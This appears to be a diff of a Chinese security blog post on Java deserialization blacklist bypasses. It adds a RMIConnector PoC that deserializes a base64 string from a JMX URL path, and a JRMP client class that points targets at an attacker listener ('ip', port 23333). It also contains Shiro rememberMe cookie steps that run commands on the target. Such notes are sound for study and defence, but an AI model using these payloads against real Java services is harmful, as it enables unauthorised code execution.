@@ -620,6 +620,24 @@
     <article class="post post-detail">
       <div class="post-content">
         <p>一些链被黑名单ban了，可以用二次反序列化绕过，比如JRMP</p>
+<h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><p>适用于服务器不出网的情况</p>
+<p>链子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RMIConnector#connect -&gt;</span><br><span class="line">    findRMIServer -&gt;findRMIServerJRMP</span><br></pre></td></tr></table></figure>
+
+<p>RMIConnector#findRMIServerJRMP对传入的base64字符串进行了反序列化</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094524982.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094524982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250827094524982"></p>
+<p>这种接收字符串，再进行反序列化的方式，很明显是个二次反序列化的点，能绕过对原始对象的resolveClass黑名单</p>
+<p>查找用法仅findRMIServer调用到了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094706778.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094706778.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250827094706778"></p>
+<p>这里调用findRMIServerJRMP需要path以&#x2F;stub&#x2F;开头</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094745911.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094745911.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250827094745911"></p>
+<p>在connect方法中，如果rmiServer字段为空，，则会调用findRMIServer，而且connect是个public方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094843635.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827094843635.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250827094843635"></p>
+<p>那么以下面的poc就能实现反序列化base64字符串：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);  </span><br><span class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/base64string&quot;</span>);  </span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h2><p>JDK&lt;8U241</p>
 <p>JRMP打RMI，在ysoserial&#x2F;exploit中，JRMPClient能利用非RMI服务（如Shiro）开RMI服务，然后用exploit&#x2F;JRMPLister打RMI服务</p>
 <p>特征：</p>
@@ -636,6 +654,14 @@
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro-exp.jar encrypt /tmp/jrmp.ser</span><br></pre></td></tr></table></figure>
 
 <p>将最后得到的字符串 Cookie 作为 rememberMe Cookie 的值，发送到目标网站。如果利用成功，则前面指定的 ping 命令会在目标服务器上执行。</p>
+<p>适用于出网情况，而且需要jdk&lt;8u231的情况下，用原始的payload，8u241可以绕过，之后就不能打了(没测试过，也许不是？遇到了再来改)</p>
+<p><a href="https://godownio.github.io/2024/09/20/rmi-san-duan-jrmp-ji-qi-gao-ban-ben-rao-guo/#RMI%E6%94%BB%E5%87%BB%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87">https://godownio.github.io/2024/09/20/rmi-san-duan-jrmp-ji-qi-gao-ban-ben-rao-guo/#RMI%E6%94%BB%E5%87%BB%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87</a></p>
+<p>可以用ysoserial生成对应的JRMPClient，不过需要对原始数据进行绕过的话，还是得自己写JRMPClient</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;  </span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;  </span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.util.Random;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp3</span> &#123;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line"> <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry  </span></span><br><span class="line"> <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;ip&quot;</span>, <span class="number">23333</span>);  </span><br><span class="line"> <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));  </span><br><span class="line"> <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);  </span><br><span class="line"> <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(Exp3.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;  </span><br><span class="line"> Registry.class  </span><br><span class="line"> &#125;, obj);  </span><br><span class="line"></span><br><span class="line"> <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"> <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);  </span><br><span class="line"> oos.writeUTF(<span class="string">&quot;SJTU&quot;</span>);  </span><br><span class="line"> oos.writeInt(<span class="number">1896</span>);  </span><br><span class="line"> oos.writeObject(proxy);  </span><br><span class="line"> oos.close();  </span><br><span class="line"></span><br><span class="line"> System.out.println(Utils.bytesTohexString(barr.toByteArray()));  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是个rmi连接，访问Registry的代码</p>
+<p>想办法在目标机器执行这个代码就行</p>
+<p>具体请见XStream 1.4.16的rmi打法</p>
 <h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>SignedObject.getObject能反序列化this.content：</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214004303.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214004303.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>content能在构造函数赋值</p>
@@ -955,7 +981,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMP"><span class="toc-text">JRMP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SignedObject"><span class="toc-text">SignedObject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0"><span class="toc-text">C3P0</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RMIConnector"><span class="toc-text">RMIConnector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMP"><span class="toc-text">JRMP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SignedObject"><span class="toc-text">SignedObject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0"><span class="toc-text">C3P0</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
@@ -988,18 +1014,18 @@
             
 
             <div class="post-img-box">
-              <a href="/2025/06/14/iast-fen-xi-jsp-ming-ling-zhi-xing-sql-zhu-ru-log4j-demo/" class="post-img " style="background-size: cover; 
+              <a href="/2025/08/28/lilctf/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8163.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8163.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8169.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8169.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
               </a>
             </div>
             <div class="post-date-title">
               <div>
                 
-                  <span class="post-date">06-14</span>
+                  <span class="post-date">08-28</span>
                 
               </div>
-              <a class="post-title" href="/2025/06/14/iast-fen-xi-jsp-ming-ling-zhi-xing-sql-zhu-ru-log4j-demo/">IAST 分析jsp命令执行/SQL注入/log4j demo</a>
+              <a class="post-title" href="/2025/08/28/lilctf/">lilctf 2025</a>
             </div>
           </div>
         
@@ -1009,18 +1035,18 @@
             
 
             <div class="post-img-box">
-              <a href="/2025/06/13/utf-8-overlong-encoding-rao-guo-waf/" class="post-img " style="background-size: cover; 
+              <a href="/2025/08/21/da-ba-bi-ji/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8162.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8162.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8168.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8168.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
               </a>
             </div>
             <div class="post-date-title">
               <div>
                 
-                  <span class="post-date">06-13</span>
+                  <span class="post-date">08-21</span>
                 
               </div>
-              <a class="post-title" href="/2025/06/13/utf-8-overlong-encoding-rao-guo-waf/">UTF-8 Overlong Encodeing 绕过WAF</a>
+              <a class="post-title" href="/2025/08/21/da-ba-bi-ji/">打靶笔记</a>
             </div>
           </div>
         
@@ -1030,18 +1056,18 @@
             
 
             <div class="post-img-box">
-              <a href="/2025/06/10/ldapattribute-jndi/" class="post-img " style="background-size: cover; 
+              <a href="/2025/08/21/chun-qiu-yun-jing-tsclient/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8161.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8161.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8167.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8167.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
               </a>
             </div>
             <div class="post-date-title">
               <div>
                 
-                  <span class="post-date">06-10</span>
+                  <span class="post-date">08-21</span>
                 
               </div>
-              <a class="post-title" href="/2025/06/10/ldapattribute-jndi/">LdapAttribute getter JNDI</a>
+              <a class="post-title" href="/2025/08/21/chun-qiu-yun-jing-tsclient/">春秋云镜 Tsclient</a>
             </div>
           </div>
         
@@ -1051,18 +1077,18 @@
             
 
             <div class="post-img-box">
-              <a href="/2025/06/04/spring-aop-lian/" class="post-img " style="background-size: cover; 
+              <a href="/2025/08/14/chun-qiu-yun-jing-delivery/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8160.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8160.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8167.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8167.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
               </a>
             </div>
             <div class="post-date-title">
               <div>
                 
-                  <span class="post-date">06-04</span>
+                  <span class="post-date">08-14</span>
                 
               </div>
-              <a class="post-title" href="/2025/06/04/spring-aop-lian/">Spring AOP链</a>
+              <a class="post-title" href="/2025/08/14/chun-qiu-yun-jing-delivery/">春秋云镜 delivery</a>
             </div>
           </div>
         
@@ -1072,18 +1098,18 @@
             
 
             <div class="post-img-box">
-              <a href="/2025/06/01/xctf-mobile-wp-part1/" class="post-img " style="background-size: cover; 
+              <a href="/2025/08/07/chun-qiu-yun-jing-hospital/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8158.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8158.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8166.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8166.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
               </a>
             </div>
             <div class="post-date-title">
               <div>
                 
-                  <span class="post-date">06-01</span>
+                  <span class="post-date">08-07</span>
                 
               </div>
-              <a class="post-title" href="/2025/06/01/xctf-mobile-wp-part1/">XCTF mobile WP part1</a>
+              <a class="post-title" href="/2025/08/07/chun-qiu-yun-jing-hospital/">春秋云镜 hospital</a>
             </div>
           </div>
         
